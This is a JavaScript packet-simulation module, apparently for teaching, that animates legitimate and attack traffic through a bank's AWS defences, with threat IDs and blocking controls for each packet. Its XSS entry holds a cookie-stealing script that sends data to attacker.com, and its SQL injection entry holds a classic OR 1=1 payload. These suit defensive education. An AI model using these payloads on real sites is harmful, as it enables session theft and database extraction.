// Motor de Simulación de Paquetes en Tiempo Real
// Basado en el Catálogo de Amenazas del Informe (Grupo 2, 2026): AMZ-001 a AMZ-030

export const PACKET_TYPES = {
  // --- TRÁFICO LEGÍTIMO Y SEGURO ---
  LEGITIMATE_QUERY: {
    id: 'legitimate_query',
    label: 'Consulta Legítima (cta-101)',
    category: 'legitimate',
    color: '#10b981', // Emerald
    protocol: 'HTTPS / TLS 1.3',
    method: 'GET',
    path: '/api/accounts/cta-101',
    payload: '{ "token": "jwt-cliente-a", "account": "cta-101" }',
    targetAccount: 'cta-101',
    fullPath: ['client_app', 'waf', 'apigw', 'cognito', 'eks_microservices', 'rds_db', 'kms', 'client_app']
  },
  LEGITIMATE_TRANSFER: {
    id: 'legitimate_transfer',
    label: 'Transacción Segura de Cliente (Q 1,500.00)',
    category: 'legitimate',
    color: '#06b6d4', // Cyan
    protocol: 'HTTPS / TLS 1.3 + OIDC PKCE',
    method: 'POST',
    path: '/api/transfers/execute',
    payload: '{ "from": "cta-101", "to": "cta-202", "amount": 1500.00, "confirmation_hash": "sha256-otp-valid-2026", "device_integrity": "SECURE_DEVICE" }',
    targetAccount: 'cta-101',
    fullPath: ['client_app', 'waf', 'apigw', 'cognito', 'eks_microservices', 'rds_db', 'kms', 'client_app'],
    successMessage: 'Transferencia autorizada y firmada por Q 1,500.00 completada sin incidentes.'
  },

  // --- AMENAZA: TROYANO BANCARIO (AMZ-006 / AMZ-010) ---
  ATTACK_BANKING_TROJAN: {
    id: 'attack_banking_trojan',
    label: 'Troyano Bancario (Desvío de Fondos a Cuenta Mula)',
    category: 'attack',
    color: '#dc2626',
    protocol: 'HTTPS / Tampered Payload (Overlay Malware)',
    method: 'POST',
    path: '/api/transfers/execute',
    payload: '{ "from": "cta-101", "to": "cta-MULE-999-EXTERNA", "amount": 11500.00, "malware_origin": "Trojan.AndroidOS.Banker", "tampered": true }',
    threatId: 'AMZ-006 / AMZ-010 (Troyano Bancario y Alteración de Transferencias)',
    dread: 8.5,
    dropAtNode: 'eks_microservices',
    dropReason: 'Control AC-01 en EKS: Discrepancia criptográfica entre la confirmación del usuario y los datos alterados por el troyano. Bloqueo 403 Forbidden y cuarentena de sesión.',
    dropHttpCode: 403,
    fullPath: ['client_app', 'waf', 'apigw', 'cognito', 'eks_microservices', 'rds_db'],
    breachEffect: {
      targetNode: 'client_app',
      type: 'trojan',
      label: 'TROYANO BANCARIO CONSUMADO: ROBO DE Q 11,500.00',
      subtext: 'Fondos desviados en secreto a cuenta mula externa (cta-MULE-999). Saldo de cliente vaciado sin confirmación reforzada.'
    }
  },

  // --- AMENAZA: COLAPSO TOTAL DEL SERVIDOR / AGOTAMIENTO OOM (AMZ-021) ---
  ATTACK_SERVER_COLLAPSE: {
    id: 'attack_server_collapse',
    label: 'Inundación Masiva / Colapso del Servidor (DoS 503)',
    category: 'attack',
    color: '#ea580c',
    protocol: 'Distributed HTTP Exhaustion Flood',
    method: 'POST',
    path: '/api/reports/bulk-export?limit=99999999',
    payload: '{ "threads": 500, "memory_exhaustion": true, "payload_size": "250MB" }',
    threatId: 'AMZ-021 (Saturación y Denegación de Servicio en Servidores)',
    dread: 8.4,
    dropAtNode: 'apigw',
    dropReason: 'AWS API Gateway Request Throttling + WAF Rate-Based Rule: Cuota superada (10,000 req/s límite). Tráfico mitigado antes de tocar clúster EKS.',
    dropHttpCode: 429,
    fullPath: ['attacker', 'waf', 'apigw', 'eks_microservices'],
    breachEffect: {
      targetNode: 'eks_microservices',
      type: 'collapse',
      label: '💥 SERVIDOR COLAPSADO: HTTP 503 SERVICE UNAVAILABLE',
      subtext: 'Memoria RAM del pod desbordada (OOMKilled). Clúster transaccional caído para todos los clientes bancarios.'
    }
  },

  // --- AMENAZA: RANSOMWARE (AMZ-019 / AMZ-013) ---
  ATTACK_RANSOMWARE: {
    id: 'attack_ransomware',
    label: 'Ransomware / Secuestro de Base de Datos',
    category: 'attack',
    color: '#991b1b',
    protocol: 'Malicious Encryption Protocol',
    method: 'POST',
    path: '/internal/db/raw-exec',
    payload: 'ENCRYPT_ALL_TABLES --key=ATTACKER_PUBKEY --drop-snapshots',
    threatId: 'AMZ-019 / AMZ-013 (Ransomware & Destrucción de Respaldos)',
    dread: 8.6,
    dropAtNode: 'kms',
    dropReason: 'AWS KMS Key Policy: Intento no autorizado de cifrado arbitrario denegado. S3 Object Lock protegió snapshots inmutables.',
    dropHttpCode: 403,
    fullPath: ['attacker', 'waf', 'apigw', 'eks_microservices', 'rds_db', 'kms'],
    breachEffect: {
      targetNode: 'rds_db',
      type: 'ransomware',
      label: '🔒 RANSOMWARE: BASE DE DATOS SECUESTRADA / CIFRADA',
      subtext: 'Tablas cifradas con clave externa. Rescate exigido: 50 BTC. Respaldos borrados en arquitectura vulnerable.'
    }
  },

  // --- AMENAZA: WORM / MOVIMIENTO LATERAL EN CLÚSTER (AMZ-012 / AMZ-014) ---
  ATTACK_WORM_LATERAL: {
    id: 'attack_worm_lateral',
    label: 'Worm / Propagación Lateral en Microservicios',
    category: 'attack',
    color: '#a21caf',
    protocol: 'Lateral TCP Port Scan',
    method: 'CONNECT',
    path: '/internal/pod-scan/10.0.3.0/24',
    payload: 'PORT_SCAN 10.0.3.0/24 --exploit=CONTAINER_ESCAPE --infect-peers',
    threatId: 'AMZ-012 / AMZ-014 (Infección de Pod y Movimiento Lateral)',
    dread: 8.0,
    dropAtNode: 'eks_microservices',
    dropReason: 'Calico NetworkPolicy en EKS: Microsegmentación Zero Trust bloqueó escaneo y tráfico lateral no autorizado entre pods.',
    dropHttpCode: 403,
    fullPath: ['attacker', 'waf', 'apigw', 'eks_microservices'],
    breachEffect: {
      targetNode: 'eks_microservices',
      type: 'worm',
      label: '🐛 WORM: CLÚSTER EKS INFECTADO / MOVIMIENTO LATERAL',
      subtext: 'Gusano propagado a 4 pods vecinos. Fuga de variables de entorno internas.'
    }
  },

  // --- AMENAZA: CROSS-SITE SCRIPTING (XSS) (AMZ-005 / AMZ-010) ---
  ATTACK_XSS: {
    id: 'attack_xss',
    label: 'Inyección XSS (<script>stealToken())',
    category: 'attack',
    color: '#e11d48',
    protocol: 'HTTP Reflected XSS',
    method: 'POST',
    path: '/api/transfers/memo',
    payload: '{ "description": "<script>fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)</script>" }',
    threatId: 'AMZ-005 / AMZ-010 (XSS en Parámetros de Transferencia)',
    dread: 7.6,
    dropAtNode: 'waf',
    dropReason: 'AWS WAF AWSManagedRulesCommonRuleSet: Firma de script malicioso XSS detectada en body de petición.',
    dropHttpCode: 403,
    fullPath: ['attacker', 'waf', 'apigw', 'client_app'],
    breachEffect: {
      targetNode: 'client_app',
      type: 'xss',
      label: '⚡ XSS: TOKEN DE SESIÓN EXTRAÍDO',
      subtext: 'Script inyectado ejecutó en el cliente robando JWT de autenticación.'
    }
  },

  // --- AMENAZA: INYECCIÓN SQL (AMZ-007) ---
  ATTACK_SQLI: {
    id: 'attack_sqli',
    label: "Inyección SQL (' OR 1=1 --)",
    category: 'attack',
    color: '#f43f5e',
    protocol: 'HTTP Probe',
    method: 'GET',
    path: "/api/accounts/cta-101' OR '1'='1' --",
    payload: "SELECT * FROM accounts WHERE id = 'cta-101' OR '1'='1' --",
    threatId: 'AMZ-007 (Inyección SQL / NoSQL)',
    dread: 8.2,
    dropAtNode: 'waf',
    dropReason: 'AWS WAF RuleSet: Firma SQLi detectada en URI. Paquete descartado en perímetro TB-02.',
    dropHttpCode: 403,
    fullPath: ['attacker', 'waf', 'apigw', 'eks_microservices', 'rds_db'],
    breachEffect: {
      targetNode: 'rds_db',
      type: 'sqli',
      label: 'SQLi: TABLA DE CUENTAS EXTRAÍDA',
      subtext: 'PostgreSQL ejecutó consulta inyectada volcando todos los saldos bancarios.'
    }
  },

  // --- AMENAZA: BOLA / ACCESO A CUENTA AJENA (AMZ-016) ---
  ATTACK_BOLA: {
    id: 'attack_bola',
    label: 'Explotación BOLA (cta-202 ajena)',
    category: 'attack',
    color: '#b91c1c',
    protocol: 'HTTPS / Manipulated ID',
    method: 'GET',
    path: '/api/accounts/cta-202',
    payload: '{ "token": "jwt-cliente-a", "requesting_account": "cta-202" }',
    threatId: 'AMZ-016 (BOLA / BOPLA)',
    dread: 8.4,
    dropAtNode: 'eks_microservices',
    dropReason: 'EKS AuthGuard: Token subject cliente.a != Titular de cta-202 (cliente.b). 403 Forbidden.',
    dropHttpCode: 403,
    fullPath: ['attacker', 'waf', 'apigw', 'cognito', 'eks_microservices', 'rds_db'],
    breachEffect: {
      targetNode: 'rds_db',
      type: 'bola',
      label: 'BOLA: ACCESO NO AUTORIZADO A CUENTA AJENA',
      subtext: 'Saldo y datos personales de Cliente B expuestos a tercero no autorizado.'
    }
  }
};

let packetCounter = 1000;

export function createPacket(typeKey, customOrigin = null) {
  const typeDef = PACKET_TYPES[typeKey] || PACKET_TYPES.LEGITIMATE_QUERY;
  packetCounter += 1;

  const originNode = customOrigin || (typeDef.category === 'attack' && typeKey !== 'ATTACK_BANKING_TROJAN' ? 'attacker' : 'client_app');
  
  // Clonar y ajustar ruta completa si el origen es personalizado (ej. ataque inyectado desde móvil)
  const pathCopy = [...typeDef.fullPath];
  if (customOrigin && pathCopy[0] !== customOrigin) {
    pathCopy[0] = customOrigin;
  }

  return {
    id: `PKT-${packetCounter}`,
    typeKey: typeDef.id,
    label: typeDef.label,
    category: typeDef.category,
    color: typeDef.color,
    protocol: typeDef.protocol,
    method: typeDef.method,
    path: typeDef.path,
    payload: typeDef.payload,
    threatId: typeDef.threatId || null,
    dread: typeDef.dread || null,
    dropAtNode: typeDef.dropAtNode || null,
    dropReason: typeDef.dropReason || null,
    dropHttpCode: typeDef.dropHttpCode || null,
    breachEffect: typeDef.breachEffect || null,
    fullPath: pathCopy,
    currentHopIdx: 0,
    currentNode: originNode,
    nextNode: pathCopy[1] || null,
    progress: 0,
    state: 'traveling', // 'traveling' | 'inspecting' | 'dropped' | 'breached' | 'delivered'
    dwellTicks: 0,       // Contador de permanencia visual en el nodo
    statusText: 'En tránsito por enlace de red',
    status: 'in_flight',
    timestamp: new Date().toLocaleTimeString('es-GT') + '.' + Math.floor(Math.random() * 900 + 100)
  };
}
